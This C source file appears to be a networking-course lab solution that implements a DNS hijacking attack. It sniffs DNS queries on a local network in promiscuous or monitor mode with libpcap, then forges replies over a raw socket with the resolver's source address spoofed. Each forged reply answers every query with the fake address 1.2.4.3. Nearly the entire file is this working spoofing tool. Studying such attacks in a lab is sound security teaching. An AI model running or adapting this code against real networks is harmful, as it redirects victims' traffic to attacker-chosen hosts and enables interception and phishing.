/*
 * pcap_example.c
 *
 *  Created on: Apr 28, 2016
 *      Author: jiaziyi
 */



#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<unistd.h>

#include "header.h"



#include "dns_hijack.h"
#include "header.h"
#include "dns.h"

//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;


int main(int argc, char *argv[])
{
	logfile = fopen("log.txt", "w");
	if (logfile == NULL) {
		perror("Unable to open log file");
		exit(1);
	}


	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;

	char filter_exp[64];
	int tar = 53;

	if (argc >= 2) {
    tar = atoi(argv[1]);
	}
	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode");
	}

	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	//BEGIN_SOLUTION
	//	char filter_exp[] = "host 192.168.1.100";	/* The filter expression */
	snprintf(filter_exp, sizeof(filter_exp), "udp && (dst port %d)", tar);
	struct bpf_program fp;		/* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	//END_SOLUTION

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}
	
	
	//Put the device in sniff loop
	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);
	fclose(logfile);

	return 0;

}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	printf("a packet is received! %d \n", total++);
	int size = header->len;

	//	print_udp_packet(buffer, size);

//	PrintData(buffer, size);

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	switch (header_type)
	{
	case LINKTYPE_ETH:
		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		in_iphr = (struct iphdr*)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		in_iphr = (struct iphdr*)(buffer + 57);
		size -= 57;
		break;

	default:
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}

	fprintf(logfile, "\n===== Raw Packet Dump =====\n");
    PrintData((const u_char *)in_iphr, size);
    fflush(logfile);
	
	print_udp_packet((u_char*)in_iphr, size);
	//to keep the DNS information received.
	res_record answers[ANS_SIZE], auth[ANS_SIZE], addit[ANS_SIZE];
	query queries[ANS_SIZE];
	bzero(queries, ANS_SIZE*sizeof(query));
	bzero(answers, ANS_SIZE*sizeof(res_record));
	bzero(auth, ANS_SIZE*sizeof(res_record));
	bzero(addit, ANS_SIZE*sizeof(res_record));

	//the UDP header
	struct udphdr *in_udphdr = (struct udphdr*)(in_iphr + 1);

	//the DNS header
	//	dns_header *dnsh = (dns_header*)(udph + 1);
	uint8_t *dns_buff = (uint8_t*)(in_udphdr + 1);

	//	parse the dns query
	int id = parse_dns_query(dns_buff, queries, answers, auth, addit);


	/******************now build the reply using raw IP ************/
	uint8_t send_buf[BUF_SIZE]; //sending buffer
	bzero(send_buf, BUF_SIZE);


	/**********dns header*************/
	

	dns_header *dnshdr = (dns_header*)(send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));
	memcpy(dnshdr, dns_buff, size - sizeof(struct iphdr) - sizeof(struct udphdr));

	build_dns_header(dnshdr, id, 1, 1, 1, 0, 0);

	uint8_t *p = (uint8_t *)(dnshdr + 1);

	for (int idx = 0; idx < ntohs(dnshdr->qd_count); idx++) {
		uint8_t domain_buf[HOST_NAME_SIZE] = {0};
		int consumed = 0;

		get_domain_name(p, send_buf, domain_buf, &consumed);

		queries[idx].qname = calloc(HOST_NAME_SIZE, sizeof(uint8_t));
		strncpy((char *)queries[idx].qname, (char *)domain_buf, HOST_NAME_SIZE - 1);

		p += consumed;
		queries[idx].ques = (question *)p;
		p += sizeof(question);
	}

	for (int idx = 0; idx < ntohs(dnshdr->qd_count); idx++) {
		int name_bytes = 0;
		build_name_section(p, (char *)queries[idx].qname, &name_bytes);
		p += name_bytes;

		r_element *rr = (r_element *)p;
		rr->type = htons(TYPE_A);
		rr->_class = htons(CLASS_IN);
		rr->ttl = htonl(255);
		rr->rdlength = htons(4);
		p += sizeof(r_element);

		const char *fake_ip = "1.2.4.3";
		inet_pton(AF_INET, fake_ip, p);
		p += 4;
	}

	size_t dns_payload_len = p - (send_buf + sizeof(struct iphdr) + sizeof(struct udphdr));

	/****************UDP header********************/
	struct udphdr *udp_hdr = (struct udphdr *)(send_buf + sizeof(struct iphdr));
	udp_hdr->source = in_udphdr->dest;
	udp_hdr->dest = in_udphdr->source;
	udp_hdr->len = htons(sizeof(struct udphdr) + dns_payload_len);
	udp_hdr->check = 0;

	struct pseudo_udp_header *ps_hdr = malloc(sizeof(struct pseudo_udp_header));
	ps_hdr->source_address = in_iphr->daddr;
	ps_hdr->dest_address = in_iphr->saddr;
	ps_hdr->placeholder = 0;
	ps_hdr->protocol = IPPROTO_UDP;
	ps_hdr->udp_length = udp_hdr->len;

	int psize = sizeof(struct pseudo_udp_header) + sizeof(struct udphdr) + dns_payload_len;
	char *pseudo_packet = malloc(psize);
	memcpy(pseudo_packet, ps_hdr, sizeof(struct pseudo_udp_header));
	memcpy(pseudo_packet + sizeof(struct pseudo_udp_header), udp_hdr, sizeof(struct udphdr) + dns_payload_len);
	udp_hdr->check = checksum((unsigned short *)pseudo_packet, psize);

	/*****************IP header************************/
	struct iphdr *ip_hdr = (struct iphdr *)send_buf;
	ip_hdr->ihl = in_iphr->ihl;
	ip_hdr->version = in_iphr->version;
	ip_hdr->tos = 0;
	ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_len);
	ip_hdr->id = htons(rand() % 65535);
	ip_hdr->frag_off = 0;
	ip_hdr->ttl = 64;
	ip_hdr->protocol = IPPROTO_UDP;
	ip_hdr->check = 0;
	ip_hdr->saddr = in_iphr->daddr;
	ip_hdr->daddr = in_iphr->saddr;
	ip_hdr->check = checksum((unsigned short *)ip_hdr, sizeof(struct iphdr));

	/************** send out using raw IP socket************/
	int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (raw_fd < 0) {
		perror("Error creating raw socket");
		exit(EXIT_FAILURE);
	}

	int enable = 1;
	setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	struct sockaddr_in target_addr = {0};
	target_addr.sin_family = AF_INET;
	target_addr.sin_addr.s_addr = ip_hdr->daddr;
	target_addr.sin_port = udp_hdr->dest;

	if (sendto(raw_fd, send_buf, sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_len,
	           0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
		perror("sendto failed");
		exit(EXIT_FAILURE);
	}

	close(raw_fd);

	// Free resources
	for (int idx = 0; idx < ntohs(dnshdr->qd_count); idx++) {
		free(queries[idx].qname);
	}
	free(ps_hdr);
	free(pseudo_packet);

}

